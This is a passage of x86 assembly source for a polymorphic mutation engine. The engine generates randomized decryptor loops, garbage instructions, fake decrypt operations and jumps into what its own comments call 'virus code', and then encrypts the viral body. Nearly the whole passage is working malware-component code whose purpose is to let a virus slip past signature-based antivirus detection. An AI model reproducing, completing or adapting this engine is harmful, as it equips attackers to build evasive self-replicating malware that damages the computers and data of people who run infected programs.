                   ;       jne loop_point
                   ;       ...
           ;       jmp decrypted-code
           ;------------------------------------------------------------

   doloopup:       mov ax,850Fh
                   stosw
                   mov eax,dword ptr [ebp+loop_point]
                   sub eax,edi
                   sub eax,00000004h
                   stosd
           call gen_garbage

           ;------------------------------------------------------------
           ;Insert a jump to virus code
           ;------------------------------------------------------------

           mov al,0E9h
           stosb
           mov eax,dword ptr [ebp+PtrToEP]
           sub eax,edi
           sub eax,00000004h
           stosd
                   ret

           ;------------------------------------------------------------
           ;...or this one:
                   ;
                   ;       loop_point:
                   ;       ...
                   ;       cmp reg,x
                   ;       je decrypted-code
                   ;       ...
                   ;       jmp loop_point
                   ;       ...
           ;------------------------------------------------------------

   doloopdown:     mov ax,840Fh
                   stosw
           mov eax,dword ptr [ebp+PtrToEP]
           sub eax,edi
           sub eax,00000004h
           stosd
                   call gen_garbage

           ;------------------------------------------------------------
                   ;Insert a jump to loop point
           ;------------------------------------------------------------

                   mov al,0E9h
                   stosb
                   mov eax,dword ptr [ebp+loop_point]
                   sub eax,edi
                   sub eax,00000004h
                   stosd
                   ret

   ;----------------------------------------------------------------------------
   ;Generate some garbage code
   ;----------------------------------------------------------------------------

   gen_garbage:    push ecx
                   push esi
           inc byte ptr [ebp+recursive_level]

                   mov eax,00000002h
                   call get_rnd_range
                   inc eax
           inc eax
                   mov ecx,eax
   loop_garbage:   push ecx
                   mov eax,(end_garbage-tbl_garbage)/04h

           cmp byte ptr [ebp+recursive_level],06h
           jae too_much_shit

                   cmp byte ptr [ebp+recursive_level],02h
                   jb ok_gen_num

           mov eax,(save_space-tbl_garbage)/04h

   ok_gen_num: call get_rnd_range
                   lea esi,dword ptr [ebp+tbl_garbage+eax*04h]
           lodsd
                   add eax,ebp
                   call eax
   too_much_shit:  pop ecx
                   loop loop_garbage

           ;------------------------------------------------------------
                   ;Update recursive level
           ;------------------------------------------------------------

   exit_gg:        dec byte ptr [ebp+recursive_level]
                   pop esi
           pop ecx
                   ret

   ;----------------------------------------------------------------------------
   ;Generate MOV reg,imm
   ;----------------------------------------------------------------------------

           ;------------------------------------------------------------
           ;Generate MOV reg32,imm
           ;------------------------------------------------------------

   g_movreg32imm:  call get_valid_reg
                   mov al,0B8h
                   or al,byte ptr [ebx+REG_MASK]
                   stosb
                   call get_rnd32
                   stosd
                   ret

           ;------------------------------------------------------------
           ;Generate MOV reg16,imm
           ;------------------------------------------------------------

   g_movreg16imm:  call get_valid_reg
                   mov ax,0B866h
                   or ah,byte ptr [ebx+REG_MASK]
                   stosw
                   call get_rnd32
                   stosw
                   ret

           ;------------------------------------------------------------
           ;Generate MOV reg8,imm
           ;------------------------------------------------------------

   g_movreg8imm:   call get_valid_reg
                   test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                   jnz a_movreg8imm
                   call get_rnd32
                   mov al,0B0h
                   or al,byte ptr [ebx+REG_MASK]
                   push eax
                   call get_rnd32
                   pop edx
                   and ax,0004h
                   or ax,dx
                   stosw
   a_movreg8imm:   ret

   ;----------------------------------------------------------------------------
   ;Generate mov reg,reg
   ;----------------------------------------------------------------------------

   g_movregreg32:  call get_rnd_reg
                   push ebx
                   call get_valid_reg
                   pop edx
                   cmp ebx,edx
                   je a_movregreg32
   c_movregreg32:  mov al,8Bh
   h_movregreg32:  mov ah,byte ptr [ebx+REG_MASK]
                   shl ah,03h
                   or ah,byte ptr [edx+REG_MASK]
                   or ah,0C0h
                   stosw
   a_movregreg32:  ret

   g_movregreg16:  call get_rnd_reg
                   push ebx
                   call get_valid_reg
                   pop edx
                   cmp ebx,edx
                   je a_movregreg32
                   mov al,66h
                   stosb
                   jmp short c_movregreg32

   g_movregreg8:   call get_rnd_reg
                   test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                   jnz a_movregreg8
                   push ebx
                   call get_valid_reg
                   pop edx
           mov al,8Ah
   h_movregreg8:   test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                   jnz a_movregreg8
                   cmp ebx,edx
                   je a_movregreg8
                   mov ah,byte ptr [ebx+REG_MASK]
                   shl ah,03h
                   or ah,byte ptr [edx+REG_MASK]
                   or ah,0C0h
                   push eax
                   call get_rnd32
                   pop edx
                   and ax,2400h
                   or ax,dx
                   stosw
   a_movregreg8:   ret

   ;----------------------------------------------------------------------------
   ;Generate xchg reg,reg
   ;----------------------------------------------------------------------------

   g_xchgregreg32: call get_valid_reg
           push ebx
           call get_valid_reg
           pop edx
           cmp ebx,edx
           je a_movregreg32
   h_xchgregreg32: mov al,87h
           jmp short h_movregreg32

   g_xchgregreg16: call get_valid_reg
           push ebx
           call get_valid_reg
           pop edx
           cmp ebx,edx
           je a_movregreg32
           mov al,66h
           stosb
           jmp short h_xchgregreg32

   g_xchgregreg8:  call get_valid_reg
                   test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                   jnz a_movregreg8
                   push ebx
                   call get_valid_reg
                   pop edx
           mov al,86h
           jmp h_movregreg8

   ;----------------------------------------------------------------------------
   ;Generate MOVZX/MOVSX reg32,reg16
   ;----------------------------------------------------------------------------

   g_movzx_movsx:  call get_rnd32
                   mov ah,0B7h
                   and al,01h
                   jz d_movzx
                   mov ah,0BFh
   d_movzx:        mov al,0Fh
                   stosw
                   call get_rnd_reg
                   push ebx
                   call get_valid_reg
                   pop edx
                   mov al,byte ptr [ebx+REG_MASK]
                   shl al,03h
                   or al,0C0h
                   or al,byte ptr [edx+REG_MASK]
                   stosb
                   ret

   ;----------------------------------------------------------------------------
   ;Generate INC reg
   ;----------------------------------------------------------------------------

   g_inc_reg32:    call get_valid_reg
           mov al,40h
           or al,byte ptr [ebx+REG_MASK]
           stosb
           ret

   g_inc_reg16:    mov al,66h
           stosb
           jmp short g_inc_reg32

   g_inc_reg8: call get_valid_reg
                   test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                   jnz a_inc_reg8
           call get_rnd32
           and ah,04h
           or ah,byte ptr [ebx+REG_MASK]
           or ah,0C0h
           mov al,0FEh
           stosw
   a_inc_reg8: ret

   ;----------------------------------------------------------------------------
   ;Generate DEC reg
   ;----------------------------------------------------------------------------

   g_dec_reg32:    call get_valid_reg
           mov al,48h
           or al,byte ptr [ebx+REG_MASK]
           stosb
           ret

   g_dec_reg16:    mov al,66h
           stosb
           jmp short g_dec_reg32

   g_dec_reg8: call get_valid_reg
                   test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                   jnz a_dec_reg8
           call get_rnd32
           and ah,04h
           or ah,byte ptr [ebx+REG_MASK]
           or ah,0C8h
           mov al,0FEh
           stosw
   a_dec_reg8: ret

   ;----------------------------------------------------------------------------
   ;Generate ADD/SUB/XOR/OR/AND reg,imm
   ;----------------------------------------------------------------------------

   g_mathregimm32: mov al,81h
                   stosb
                   call get_valid_reg
                   call do_math_work
                   stosd
                   ret

   g_mathregimm16: mov ax,8166h
                   stosw
                   call get_valid_reg
                   call do_math_work
                   stosw
                   ret

   g_mathregimm8:  call get_valid_reg
                   test byte ptr [ebx+REG_FLAGS],REG_NO_8BIT
                   jnz a_math8
                   mov al,80h
                   stosb
                   call do_math_work
                   stosb
                   and ah,04h
                   or byte ptr [edi-00000002h],ah
   a_math8:        ret

   do_math_work:   mov eax,end_math_imm-tbl_math_imm
                   call get_rnd_range
                   lea esi,dword ptr [ebp+eax+tbl_math_imm]
                   lodsb
                   or al,byte ptr [ebx+REG_MASK]
                   stosb
                   call get_rnd32
                   ret

   ;----------------------------------------------------------------------------
   ;Generate decryption instructions (real or fake ones)
   ;----------------------------------------------------------------------------

           ;------------------------------------------------------------
           ;Check if we are going to use a displacement in the
                   ;indexing mode
           ;------------------------------------------------------------

   fake_or_not:    mov eax,dword ptr [ebp+fake_ptr_disp]
                   or eax,eax
                   jnz more_complex

           ;------------------------------------------------------------
                   ;Choose generator for [reg] indexing mode
           ;------------------------------------------------------------

                   mov edx,offset tbl_idx_reg
                   call choose_magic
                   jmp you_got_it

           ;------------------------------------------------------------
           ;More fun?!?!
           ;------------------------------------------------------------

   more_complex:   mov al,byte ptr [ebp+fake_build_flags]
                   test al,CRYPT_SIMPLEX
                   jnz crypt_xtended

           ;------------------------------------------------------------
                   ;Choose generator for [reg+imm] indexing mode
           ;------------------------------------------------------------

                   mov edx,offset tbl_dis_reg
                   call choose_magic

           ;------------------------------------------------------------
           ;Use magic to convert some values into
                   ;desired instructions
           ;------------------------------------------------------------

   you_got_it:     call size_correct
                   mov dl,byte ptr [ebp+fake_index_mask]
                   lodsb
                   or al,al
                   jnz adn_reg_01
                   cmp dl,00000101b
                   je adn_reg_02
   adn_reg_01:     lodsb
                   or al,dl
                   stosb
                   jmp common_part
   adn_reg_02:     lodsb
                   add al,45h
                   xor ah,ah
                   stosw
                   jmp common_part

           ;------------------------------------------------------------
           ;Choose [reg+reg] or [reg+reg+disp]
           ;------------------------------------------------------------

   crypt_xtended:  xor eax,eax
           mov dword ptr [ebp+disp2disp],eax ;Clear disp-over-disp

                   test al,CRYPT_COMPLEX
                   jz ok_complex

           ;------------------------------------------------------------
                   ;Get random displacement from current displacement
                   ;eeehh?!?
           ;------------------------------------------------------------

                   mov eax,00001000h
                   call get_rnd_range
                   mov dword ptr [ebp+disp2disp],eax
                   call load_aux

                   push ebx

                   call gen_garbage

           ;------------------------------------------------------------
                   ;Choose generator for [reg+reg+imm] indexing mode
           ;------------------------------------------------------------

                   mov edx,offset tbl_paranoia
                   call choose_magic
                   jmp short done_xtended

   ok_complex:     mov eax,dword ptr [ebp+fake_ptr_disp]
                   call load_aux

                   push ebx

                   call gen_garbage

           ;------------------------------------------------------------
                   ;Choose generator for [reg+reg] indexing mode
           ;------------------------------------------------------------

                   mov edx,offset tbl_xtended
                   call choose_magic

           ;------------------------------------------------------------
           ;Build decryptor instructions
           ;------------------------------------------------------------

   done_xtended:   call size_correct

                   pop ebx

                   mov dl,byte ptr [ebp+fake_index_mask]
                   lodsb
                   mov cl,al
                   or al,al
                   jnz arn_reg_01
                   cmp dl,00000101b
                   jne arn_reg_01
                   lodsb
                   add al,40h
                   stosb
                   jmp short arn_reg_02
   arn_reg_01:     movsb
   arn_reg_02:     mov al,byte ptr [ebx+REG_MASK]
                   shl al,03h
                   or al,dl
                   stosb
                   or cl,cl
                   jnz arn_reg_03
                   cmp dl,00000101b
                   jne arn_reg_03
                   xor al,al
                   stosb

           ;------------------------------------------------------------
           ;Restore aux reg state
           ;------------------------------------------------------------

   arn_reg_03:     xor byte ptr [ebx+REG_FLAGS],REG_READ_ONLY

           ;------------------------------------------------------------
           ;Get post-build flags
           ;------------------------------------------------------------

   common_part:    lodsb

           ;------------------------------------------------------------
                   ;Insert displacement from real address?
           ;------------------------------------------------------------

                   test al,MAGIC_PUTDISP
                   jz skip_disp
                   push eax
                   mov eax,dword ptr [ebp+fake_ptr_disp]
                   sub eax,dword ptr [ebp+disp2disp]
                   neg eax
                   stosd
                   pop eax

           ;------------------------------------------------------------
           ;Insert key?
           ;------------------------------------------------------------

   skip_disp:      test al,MAGIC_PUTKEY
                   jz skip_key
                   call copy_key

   skip_key:       ret

   ;----------------------------------------------------------------------------
   ;Choose a magic generator
   ;----------------------------------------------------------------------------

   choose_magic:   mov eax,00000006h
                   call get_rnd_range
                   add edx,ebp
                   lea esi,dword ptr [edx+eax*04h]
                   lodsd
                   add eax,ebp
                   mov esi,eax
                   ret

   ;----------------------------------------------------------------------------
   ;Do operand size correction
   ;----------------------------------------------------------------------------

   size_correct:   lodsb
                   mov ah,byte ptr [ebp+fake_oper_size]
                   cmp ah,01h
                   je store_correct
                   inc al
                   cmp ah,04h
                   je store_correct
                   mov ah,66h
                   xchg ah,al
                   stosw
                   ret
   store_correct:  stosb
                   ret

   ;----------------------------------------------------------------------------
   ;Load aux reg with displacement
   ;----------------------------------------------------------------------------

           ;------------------------------------------------------------
           ;Get a valid auxiliary register
           ;------------------------------------------------------------

   load_aux:       push eax
                   call get_valid_reg
                   or byte ptr [ebx+REG_FLAGS],REG_READ_ONLY

           ;------------------------------------------------------------
                   ;Move displacement into aux reg
           ;------------------------------------------------------------

                   mov al,0B8h
                   or al,byte ptr [ebx+REG_MASK]
                   stosb
                   pop eax
                   neg eax
                   stosd
                   ret

   ;----------------------------------------------------------------------------
   ;Generate push reg + garbage + pop reg
   ;----------------------------------------------------------------------------

   g_push_g_pop:   call gen_garbage

           call get_rnd32
           test al,01h
           jnz skip_sp_push

           call push_with_sp
           jmp short from_push

   skip_sp_push:   call get_rnd_reg
                   mov al,50h
                   or al,byte ptr [ebx+REG_MASK]
                   stosb
           call gen_garbage

   from_push:  call get_rnd32
           test al,01h
           jz pop_with_sp

           call get_valid_reg
                   mov al,58h
                   or al,byte ptr [ebx+REG_MASK]
                   stosb

           call gen_garbage
                   ret

   ;----------------------------------------------------------------------------
   ;Emulate a PUSH instruction, using SUB ESP,00000004h
   ;----------------------------------------------------------------------------

   push_with_sp:   mov eax,0004EC83h
           stosd
           dec edi
           call gen_garbage
           ret

   ;----------------------------------------------------------------------------
   ;Emulate a POP instruction, using ADD ESP,00000004h
   ;----------------------------------------------------------------------------

   pop_with_sp:    mov eax,0004C483h
           stosd
           dec edi
           call gen_garbage
           ret

   ;----------------------------------------------------------------------------
   ;Generate RET in different ways
   ;----------------------------------------------------------------------------

   gen_ret:    mov eax,00000004h
           call get_rnd_range
           or eax,eax
           jnz just_ret

           call get_valid_reg
                   mov al,58h
                   or al,byte ptr [ebx+REG_MASK]
                   stosb
           or byte ptr [ebx+REG_FLAGS],REG_READ_ONLY
           push ebx
           call gen_garbage
           pop ebx
           xor byte ptr [ebx+REG_FLAGS],REG_READ_ONLY
           mov ax,0E0FFh
           or ah,byte ptr [ebx+REG_MASK]
           stosw
           ret

   just_ret:   mov al,0C3h
                   stosb
           ret

   ;----------------------------------------------------------------------------
   ;Generate CALL without return
   ;----------------------------------------------------------------------------

   g_call_cont:    mov al,0E8h
                   stosb
                   push edi
                   stosd
                   call gen_rnd_block
                   pop edx
                   mov eax,edi
                   sub eax,edx
                   sub eax,00000004h
                   mov dword ptr [edx],eax
                   call gen_garbage

           call get_rnd32
           test al,01h
           jz pop_with_sp

           call get_valid_reg
                   mov al,58h
                   or al,byte ptr [ebx+REG_MASK]
                   stosb

           call gen_garbage
                   ret

   ;----------------------------------------------------------------------------
   ;Generate unconditional jumps
   ;----------------------------------------------------------------------------

   g_jump_u:       mov al,0E9h
                   stosb
                   push edi
                   stosd
                   call gen_rnd_block
                   pop edx
                   mov eax,edi
                   sub eax,edx
                   sub eax,00000004h
                   mov dword ptr [edx],eax
           call gen_garbage
                   ret

   g_save_jump:    mov al,0E9h
                   stosb
                   push edi
                   stosd
                   call gen_rnd_block
                   pop edx
                   mov eax,edi
                   sub eax,edx
                   sub eax,00000004h
                   mov dword ptr [edx],eax
                   ret

   ;----------------------------------------------------------------------------
   ;Generate conditional jumps
   ;----------------------------------------------------------------------------

   g_jump_c:       call get_rnd32
                   and ah,0Fh
                   add ah,80h
                   mov al,0Fh
                   stosw
                   push edi
                   stosd
                   call gen_garbage
                   pop edx
                   mov eax,edi
                   sub eax,edx
                   sub eax,00000004h
                   mov dword ptr [edx],eax
           call gen_garbage
                   ret

   g_save_jump_c:  call get_rnd32
                   and ah,0Fh
                   add ah,80h
                   mov al,0Fh
                   stosw
           xor eax,eax
                   stosd
           ret

   ;----------------------------------------------------------------------------
   ;Generate MOV [mem],reg
   ;----------------------------------------------------------------------------

   gen_mov_mem8:   mov dl,88h
           jmp mem8wr
   gen_mov_mem16:  mov al,66h
           stosb
   gen_mov_mem32:  mov dl,89h
           jmp gen_mem_wr

   gen_add_mem8:   mov dl,00h
           jmp mem8wr
   gen_add_mem16:  mov al,66h
           stosb
   gen_add_mem32:  mov dl,01h
           jmp gen_mem_wr

   gen_sub_mem8:   mov dl,28h
           jmp mem8wr
   gen_sub_mem16:  mov al,66h
           stosb
   gen_sub_mem32:  mov dl,29h
           jmp gen_mem_wr

   gen_adc_mem8:   mov dl,10h
           jmp mem8wr
   gen_adc_mem16:  mov al,66h
           stosb
   gen_adc_mem32:  mov dl,11h
           jmp gen_mem_wr

   gen_sbb_mem8:   mov dl,18h
           jmp mem8wr
   gen_sbb_mem16:  mov al,66h
           stosb
   gen_sbb_mem32:  mov dl,19h
           jmp gen_mem_wr

   gen_or_mem8:    mov dl,08h
           jmp mem8wr
   gen_or_mem16:   mov al,66h
           stosb
   gen_or_mem32:   mov dl,09h
           jmp gen_mem_wr

   gen_and_mem8:   mov dl,20h
           jmp mem8wr
   gen_and_mem16:  mov al,66h
           stosb
   gen_and_mem32:  mov dl,21h
           jmp gen_mem_wr

   gen_xor_mem8:   mov dl,30h
           jmp mem8wr
   gen_xor_mem16:  mov al,66h
           stosb
   gen_xor_mem32:  mov dl,31h
           jmp gen_mem_wr

   mem8wr:     call gen_mem_wr
           call get_rnd32
           and al,20h
           or byte ptr [edi-00000005h],al
           ret

   gen_mem_wr: call get_rnd_reg
           mov ah,byte ptr [ebx+REG_MASK]
           or ah,ah
           jnz skip_wr_eax
           cmp dl,88h
           je gen_mem_wr
           cmp dl,89h
           je gen_mem_wr

   skip_wr_eax:    shl ah,03h
           or ah,05h
           mov al,dl
           stosw

           movzx eax,byte ptr [ebp+NumberOfDataAreas]
           call get_rnd_range
           lea esi,dword ptr [ebp+tbl_data_area+eax*08h]
           lodsd
           push eax
           lodsd
           sub eax,00000004h
           call get_rnd_range
           pop edx
           add eax,edx
           stosd

           ret

   ;----------------------------------------------------------------------------
   ;Generate clc/stc/cmc/cld/std
   ;----------------------------------------------------------------------------

   gen_save_code:  mov eax,end_save_code-tbl_save_code
                   call get_rnd_range
                   mov al,byte ptr [ebp+tbl_save_code+eax]
                   stosb
                   ret

   ;----------------------------------------------------------------------------
   ;Generate code that does not change register contents
   ;----------------------------------------------------------------------------

   gen_free:   mov eax,00000003h
                   call get_rnd_range
                   inc eax
                   mov ecx,eax
   loop_free:  push ecx
                   mov eax,(end_free-tbl_free)/04h
                   call get_rnd_range
                   lea esi,dword ptr [ebp+tbl_free+eax*04h]
                   lodsd
                   add eax,ebp
                   call eax
                   pop ecx
                   loop loop_free
           ret

   ;----------------------------------------------------------------------------
   ;Generate fake decrypt instructions
   ;----------------------------------------------------------------------------

   gen_fake_crypt: cmp byte ptr [ebp+recursive_level],03h
           jae bad_fake_size

           cmp byte ptr [ebp+NumberOfDataAreas],02h
           jb bad_fake_size

           push dword ptr [ebp+fake_ptr_disp]
           push dword ptr [ebp+fake_crypt_key]
           mov dl,byte ptr [ebp+fake_build_flags]
           mov dh,byte ptr [ebp+fake_index_mask]
           shl edx,08h
           mov dl,byte ptr [ebp+fake_oper_size]
           push edx

                   call get_rnd32          ;Get encryption key

                   mov dword ptr [ebp+fake_crypt_key],eax

                   call get_rnd32          ;Get generation flags

                   mov byte ptr [ebp+fake_build_flags],al

                   call get_rnd32          ;Get size of mem operand
                   and al,03h
                   cmp al,01h
                   je ok_fake_size
                   cmp al,02h
                   je ok_fake_size
                   inc al
   ok_fake_size:   mov byte ptr [ebp+fake_oper_size],al

                   call get_rnd32          ;Choose displacement
                   and eax,00000001h
                   jz ok_fake_disp

           call get_rnd32
                   and eax,000FFFFFh
           call get_rnd_range
           inc eax
           neg eax
   ok_fake_disp:   mov dword ptr [ebp+fake_ptr_disp],eax

           movzx eax,byte ptr [ebp+NumberOfDataAreas]
           call get_rnd_range
           lea esi,dword ptr [ebp+tbl_data_area+eax*08h]
           lodsd
           add eax,dword ptr [ebp+fake_ptr_disp]
           push eax
           lodsd
           sub eax,00000004h
           call get_rnd_range

           pop edx
           add eax,edx
           push eax

               call get_valid_reg

           or byte ptr [ebx+REG_FLAGS],REG_IS_INDEX
                   mov al,byte ptr [ebx+REG_MASK]
           mov byte ptr [ebp+fake_index_mask],al
           or al,0B8h
                   stosb
           pop eax
           stosd

           push ebx
           call gen_garbage                ;Garbage
           call fake_or_not
           call gen_garbage                ;Garbage
           pop ebx

           xor byte ptr [ebx+REG_FLAGS],REG_IS_INDEX

           pop eax
           mov byte ptr [ebp+fake_oper_size],al
           shr eax,08h
           mov byte ptr [ebp+fake_index_mask],ah
           mov byte ptr [ebp+fake_build_flags],al
           pop dword ptr [ebp+fake_crypt_key]
           pop dword ptr [ebp+fake_ptr_disp]
   bad_fake_size:  ret

   ;----------------------------------------------------------------------------
   ;Get a ramdom reg
   ;----------------------------------------------------------------------------

   get_rnd_reg:    mov eax,00000007h
                   call get_rnd_range
                   lea ebx,dword ptr [ebp+tbl_regs+eax*02h]
                   ret

   ;----------------------------------------------------------------------------
   ;Get a ramdom reg (avoid REG_READ_ONLY, REG_IS_COUNTER and REG_IS_INDEX)
   ;----------------------------------------------------------------------------

   get_valid_reg:  call get_rnd_reg
                   mov al,byte ptr [ebx+REG_FLAGS]
                   and al,REG_IS_INDEX or REG_IS_COUNTER or REG_READ_ONLY
                   jnz get_valid_reg
                   ret

   ;----------------------------------------------------------------------------
   ;Load ecx with crypt_size / oper_size
   ;----------------------------------------------------------------------------

   fixed_size2ecx: mov eax,dword ptr [ebp+SizeCrypt]
                   xor ecx,ecx
                   mov cl,byte ptr [ebp+oper_size]
                   shr ecx,01h
                   or ecx,ecx
                   jz ok_2ecx
                   shr eax,cl
                   jnc ok_2ecx
                   inc eax
   ok_2ecx:        mov ecx,eax
                   ret

   ;----------------------------------------------------------------------------
   ;Generate polymorphic decryptor... Whats new on this poly engine?
   ;
   ;- No need to get delta offset
   ;- New garbage generators:
   ;
   ;   o Fake decrypt instructions
   ;   o Instructions that write/read from/to memory
   ;   o New ways for JMP
   ;   o New ways for POP
   ;
   ;- The engine can be called several times in order to produce multi-layer
   ;  polymorphic encrytion
   ;
   ;On entry:
   ;       esi -> Pointer to code
   ;       edi -> Where to generate polymorphic decryptor
   ;       ecx -> Size of area to encrypt
   ;       edx -> Entry point to code once decrypted
   ;On exit:
   ;       ecx -> Decryptor size
   ;       edi -> End of decryptor
   ;
   ;----------------------------------------------------------------------------

   Mutate:     push ebx                ;Save base address
           add edx,ebx
           mov dword ptr [ebp+PtrToEP],edx     ;Save ptr to entry-point

           mov dword ptr [ebp+PtrToCrypt],esi  ;Save crypt offset
           mov dword ptr [ebp+PtrToDecrypt],edi
           mov dword ptr [ebp+SizeCrypt],ecx   ;Save size of block

                   lea esi,dword ptr [ebp+tbl_startup] ;Init register table
                   lea edi,dword ptr [ebp+     \
                      tbl_regs+    \
                      REG_FLAGS]
                   mov ecx,00000007h
   loop_init_regs: lodsb
                   stosb
                   inc edi
                   loop loop_init_regs

                   xor eax,eax
           mov byte ptr [ebp+NumberOfDataAreas],al ;Clear # of data area
           mov byte ptr [ebp+recursive_level],al   ;Clear recursive

           mov ecx,NUM_DA
           lea edi,dword ptr [ebp+tbl_data_area]   ;Init data areas
   loop_init_da:   stosd
           stosd
           loop loop_init_da

                   call get_valid_reg      ;Choose index register
                   mov al,byte ptr [ebx+REG_MASK]
                   mov byte ptr [ebp+index_mask],al
                   or byte ptr [ebx+REG_FLAGS],REG_IS_INDEX

                   xor eax,eax         ;Init call table
                   mov ecx,00000005h
                   lea edi,dword ptr [ebp+style_table+00000004h]
   clear_style:    stosd
                   add edi,00000004h
                   loop clear_style

                   call get_valid_reg      ;Choose counter register
                   mov al,byte ptr [ebx+REG_MASK]
                   mov byte ptr [ebp+counter_mask],al
                   or byte ptr [ebx+REG_FLAGS],REG_IS_COUNTER

                   call get_rnd32          ;Choose displacement
                   and eax,00000001h
                   jz ok_disp
                   call get_rnd32
                   and eax,000FFFFFh
   ok_disp:        mov dword ptr [ebp+ptr_disp],eax

                   call get_rnd32              ;Get encryption key
                   mov dword ptr [ebp+crypt_key],eax

                   call get_rnd32              ;Get generation flags
                   mov byte ptr [ebp+build_flags],al

                   call get_rnd32          ;Get size of mem operand
                   and al,03h
                   cmp al,01h
                   je get_size_ok
                   cmp al,02h
                   je get_size_ok
                   inc al
   get_size_ok:    mov byte ptr [ebp+oper_size],al

           mov edi,dword ptr [ebp+PtrToDecrypt];Ptr to decryptor

                   call gen_rnd_block          ;Random data block
                   mov ecx,00000005h           ;Generate 5 routines

   do_subroutine:  push ecx

   routine_done:   mov eax,00000005h           ;Random step
                   call get_rnd_range
                   lea esi,dword ptr [ebp+style_table+eax*08h]

                   xor edx,edx             ;Already generated?
                   cmp dword ptr [esi+00000004h],edx
                   jne routine_done

                   push edi                ;Generate routine
                   call gen_garbage
                   lodsd
                   pop dword ptr [esi]
                   add eax,ebp
                   call eax
                   call gen_garbage

           call gen_ret

           call gen_rnd_block

                   pop ecx             ;Generate next subroutine
                   loop do_subroutine

           mov dword ptr [ebp+entry_point],edi ;Decryptor entry-point

           ;------------------------------------------------------------
           ;If this is the 1st decryptor we need to save
           ;some regs
           ;------------------------------------------------------------

           cmp byte ptr [ebp+IsFirst],00h
           je SkipSaveRegs

           call gen_free           ;Random code, save regs
           mov al,60h          ;We need to PUSHAD
           stosb

   SkipSaveRegs:   call gen_garbage        ;We can trash regs now

                   lea esi,dword ptr [ebp+style_table+00000004h]
                   mov ecx,00000005h

   do_call:        push ecx            ;Gen CALL to each step
                   cmp ecx,00000003h
                   jne is_not_loop
                   call gen_garbage
                   mov dword ptr [ebp+loop_point],edi
   is_not_loop:    call gen_garbage
                   mov al,0E8h         ;CALL opcode
                   stosb
                   lodsd
                   sub eax,edi
                   sub eax,00000004h
                   stosd
                   call gen_garbage
                   lodsd
                   pop ecx
                   loop do_call

                   call gen_garbage        ;End condition
                   call gen_loop
           call gen_rnd_block

           pop ebx

           push edi
                   sub edi,dword ptr [ebp+PtrToDecrypt]
           push edi

           mov edi,dword ptr [ebp+PtrToCrypt]
           add edi,ebx
                   call fixed_size2ecx     ;Encrypt requested area
   loop_hide_code: push ecx
                   mov eax,dword ptr [edi]
                   call perform_crypt
                   xor ecx,ecx
                   mov cl,byte ptr [ebp+oper_size]
   loop_copy_res:  stosb
                   shr eax,08h
                   loop loop_copy_res
                   pop ecx
                   loop loop_hide_code

           mov edx,dword ptr [ebp+entry_point]

           sub edx,ebx         ;Get entry-point offset

           pop ecx
           pop edi

           ret

   ;----------------------------------------------------------------------------
   ;Poly engine initialized data
   ;----------------------------------------------------------------------------

                   ;------------------------------------------------------------
                   ;Register table
                   ;
                   ; 00h -> BYTE -> Register mask
                   ; 01h -> BYTE -> Register flags
                   ;------------------------------------------------------------

   tbl_regs        equ $

                   db 00000000b,REG_READ_ONLY      ;eax
                   db 00000011b,00h                ;ebx
                   db 00000001b,00h                ;ecx
                   db 00000010b,00h                ;edx
                   db 00000110b,REG_NO_8BIT        ;esi
                   db 00000111b,REG_NO_8BIT        ;edi
                   db 00000101b,REG_NO_8BIT        ;ebp

   end_regs        equ $

                   ;------------------------------------------------------------
                   ;Aliases for reg table structure
                   ;------------------------------------------------------------

   REG_MASK        equ 00h
   REG_FLAGS       equ 01h

                   ;------------------------------------------------------------
                   ;Bit aliases for reg flags
                   ;------------------------------------------------------------

   REG_IS_INDEX    equ 01h         ;Register used as main index register
   REG_IS_COUNTER  equ 02h         ;This register is used as loop counter
   REG_READ_ONLY   equ 04h         ;Never modify the value of this register
   REG_NO_8BIT     equ 08h         ;ESI EDI and EBP havent 8bit version

                   ;------------------------------------------------------------
                   ;Initial reg flags
                   ;------------------------------------------------------------

   tbl_startup     equ $

                   db REG_READ_ONLY        ;eax
                   db 00h                  ;ebx
                   db 00h                  ;ecx
                   db 00h                  ;edx
                   db REG_NO_8BIT          ;esi
                   db REG_NO_8BIT          ;edi
                   db REG_NO_8BIT          ;ebp

                   ;------------------------------------------------------------
                   ;Code that does not disturb reg values
                   ;------------------------------------------------------------

   tbl_save_code   equ $

                   clc
                   stc
                   cmc
                   cld
                   std

   end_save_code   equ $

                   ;------------------------------------------------------------
                   ;Generators for [reg] indexing mode
                   ;------------------------------------------------------------

   tbl_idx_reg     equ $

                   dd offset xx_inc_reg
                   dd offset xx_dec_reg
                   dd offset xx_not_reg
                   dd offset xx_add_reg
                   dd offset xx_sub_reg
                   dd offset xx_xor_reg

                   ;------------------------------------------------------------
                   ;Generators for [reg+imm] indexing mode
                   ;------------------------------------------------------------

   tbl_dis_reg     equ $

                   dd offset yy_inc_reg
                   dd offset yy_dec_reg
                   dd offset yy_not_reg
                   dd offset yy_add_reg
                   dd offset yy_sub_reg
                   dd offset yy_xor_reg

                   ;------------------------------------------------------------
                   ;Generators for [reg+reg] indexing mode
                   ;------------------------------------------------------------

   tbl_xtended     equ $

                   dd offset zz_inc_reg
                   dd offset zz_dec_reg
                   dd offset zz_not_reg
                   dd offset zz_add_reg
                   dd offset zz_sub_reg
                   dd offset zz_xor_reg

                   ;------------------------------------------------------------
                   ;Generators for [reg+reg+imm] indexing mode
                   ;------------------------------------------------------------

   tbl_paranoia    equ $

                   dd offset ii_inc_reg
                   dd offset ii_dec_reg
                   dd offset ii_not_reg
                   dd offset ii_add_reg
                   dd offset ii_sub_reg
                   dd offset ii_xor_reg

                   ;------------------------------------------------------------
                   ;Opcodes for math reg,imm
                   ;------------------------------------------------------------

   tbl_math_imm    equ $

                   db 0C0h                         ;add
                   db 0C8h                         ;or
                   db 0E0h                         ;and
                   db 0E8h                         ;sub
                   db 0F0h                         ;xor
                   db 0D0h                         ;adc
                   db 0D8h                         ;sbb

   end_math_imm    equ $

                   ;------------------------------------------------------------
                   ;Magic aliases
                   ;------------------------------------------------------------

   MAGIC_PUTKEY    equ 01h
   MAGIC_PUTDISP   equ 02h
   MAGIC_ENDSTR    equ 0FFh
   MAGIC_ENDKEY    equ 0FEh
   MAGIC_CAREEBP   equ 00h
   MAGIC_NOTEBP    equ 0FFh

                   ;------------------------------------------------------------
                   ;Magic data
                   ;------------------------------------------------------------

